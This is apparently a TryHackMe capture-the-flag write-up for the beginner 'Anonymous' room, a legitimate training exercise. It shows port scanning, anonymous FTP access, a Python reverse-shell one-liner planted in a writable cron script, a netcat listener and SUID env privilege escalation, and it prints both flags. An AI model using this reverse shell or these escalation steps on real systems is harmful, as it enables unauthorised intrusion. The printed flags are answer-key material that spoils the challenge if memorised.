---
title: "Anonymous - TryHackMe"
author: Ludovic COULON
date: 2020-05-19
hero: ./images/hero.png
excerpt: "Writeup for the Anonymous on TryHackMe"
---

[TryHackMe | Anonymous](https://tryhackme.com/room/anonymous)

Try to get the two flags! Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners.
Acquiring both flags will require some basic knowledge of Linux and
privilege escalation methods.

<div className="Image__Medium">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1024px-Anonymous_emblem.svg.png" alt="blog_image" />
</div>

For more information on Linux, check out [Learn Linux](https://tryhackme.com/room/zthlinux)

---

### #1 Enumerate the machine. How many ports are open?

```bash
➜  TryHackMe nmap -A -vv 10.10.131.140
```

```bash
21/tcp  open  ftp         vsftpd 2.0.8 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:

22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### #2 What service is running on port 21?

```bash
21/tcp  open  ftp         vsftpd 2.0.8 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
```

```bash
ftp
```

### #3 What service is running on ports 139 and 445?

```bash
smb
```

### #4 There's a share on the user's computer. What's it called?

<div className="Image__Medium">
  <img src="https://imgur.com/4X6K5lM.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/5Aznrzp.png" alt="blog_image" />
</div>

```bash
➜  TryHackMe smbclient -L  10.10.131.140
Enter WORKGROUP\kali password:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```bash
pics
```

### #5 user.txt

Let's go to the ftp using the anonymous login

```bash
➜  TryHackMe ftp 10.10.215.153
Connected to 10.10.215.153.
220 NamelessOne FTP Server!
Name (10.10.215.153:kali): anonymous
331 Please specify the password.
Password: no password there
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 May 14 14:52 clean.sh
-rw-rw-r--    1 1000     1000           86 May 17 22:55 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
```

Let's put a reverse shell in the ftp shall we ? c:

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

You can use whatever you want I will use the python reverse shell.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.228",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Rename the payload 'clean.sh' and put it in the ftp

```bash
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
226 bytes sent in 0.00 secs (2.3427 MB/s)
```

Now let's wait the ftp server to execute the payload

```bash
➜  TryHackMe nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.9.2.228] from (UNKNOWN) [10.10.215.153] 37426
/bin/sh: 0: cant access tty; job control turned off
$ ls
pics
user.txt
$ cat user.txt
90d6f992585815ff991e68748c414740
```

### #6 root.txt

```bash
$ find / -perm -u=s -type f 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
$ ./env /bin/sh -p
/bin/sh: 4: ./env: not found
$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
$ id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

[All the suid shell on GTFOBins | GTFOBins](https://gtfobins.github.io/#+suid)

```bash
$ cd /root/
cd /root/
$ ls
ls
root.txt
$ cat root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/p0h00A1.png" alt="TryhackMeProfile" />
  </a>
</center>
